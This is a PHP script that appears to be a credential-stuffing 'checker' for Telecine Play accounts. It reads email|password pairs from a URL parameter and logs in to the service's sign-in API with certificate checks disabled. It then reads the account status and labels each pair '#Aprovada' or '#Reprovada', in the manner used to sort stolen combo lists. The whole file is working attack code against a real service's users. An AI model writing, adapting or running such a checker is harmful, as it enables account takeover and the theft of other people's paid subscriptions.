<?php
clear();
error_reporting(0);

$linhas = $_GET['linhas'];
$separar = explode("|", $linhas);
$email = $separar[0];
$senha = $separar[1];

function extrair($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}

function clear(){
  if(file_exists('cookies.txt')){
    @unlink('cookies.txt');
  }
}

$ch = curl_init();
curl_setopt_array($ch, array(
	CURLOPT_URL => 'https://www.telecineplay.com.br/api/authorization/sign-in-mpx',
	CURLOPT_RETURNTRANSFER => 1,
	CURLOPT_FOLLOWLOCATION => 1,
	CURLOPT_SSL_VERIFYPEER => 0,
	CURLOPT_SSL_VERIFYHOST => 0,
	CURLOPT_HTTPHEADER => array(
		'Content-type: application/json',
		'accept: application/json',
		'origin: https://www.telecineplay.com.br',
		'referer: https://www.telecineplay.com.br/',
		'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
	),
	CURLOPT_COOKIEJAR => getcwd().'/cookies.txt',
	CURLOPT_COOKIEFILE => getcwd().'/cookies.txt',
	CURLOPT_POSTFIELDS => '{"username":"'.$email.'","password":"'.$senha.'","cookieType":"Persistent"}',
	CURLOPT_CUSTOMREQUEST => 'POST',
));
$login = curl_exec($ch);

if(strpos($login, '{"status":"successful') !== false){

	$TOKEN = extrair($login, '{"value":"', '"');

	$ch = curl_init();
	curl_setopt_array($ch, array(
		CURLOPT_URL => 'https://www.telecineplay.com.br/api/account?ff=idp%2Cldp',
		CURLOPT_RETURNTRANSFER => 1,
		CURLOPT_FOLLOWLOCATION => 1,
		CURLOPT_SSL_VERIFYPEER => 0,
		CURLOPT_SSL_VERIFYHOST => 0,
		CURLOPT_HTTPHEADER => array(
			'Content-type: application/x-www-form-urlencoded',
			'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
			'Pragma: no-cache',
			'Accept: */*',
			'X-Authorization: Bearer '.$TOKEN.''
		),
		CURLOPT_COOKIEJAR => getcwd().'/cookies.txt',
		CURLOPT_COOKIEFILE => getcwd().'/cookies.txt',
		CURLOPT_CUSTOMREQUEST => 'GET',
	));
	$payment = curl_exec($ch);

	if(strpos($payment, 'status":"SuspendedByPaymentIssues"}') !== false){

		echo "#Reprovada $linhas | Status: FALTA DE PAGAMENTO.";

	}else{

		$status = extrair($payment, '"status":"', '"');

		echo "#Aprovada $linhas | Status: $status.";

	}

}elseif (strpos($login, '{"code":4,"message') !== false) {
	
	echo "#Reprovada $linhas | e-mail ou senha estão incorretos.";

}elseif (strpos($login, '{"code":"InvalidContent') !== false) {
	
	echo "#Reprovada $linhas | e-mail ou senha estão incorretos.";

}elseif (strpos($login, '{"code":7,"message":"') !== false) {

	echo "#Reprovada $linhas | LOGIN RUIM.";

}elseif (strpos($login, '{"code":103,"') !== false) {

	echo "#Reprovada $linhas | LOGIN RUIM.";

}else{

	echo "#Reprovada $linhas | Error Desconhecido.";

}

curl_close($ch);
?>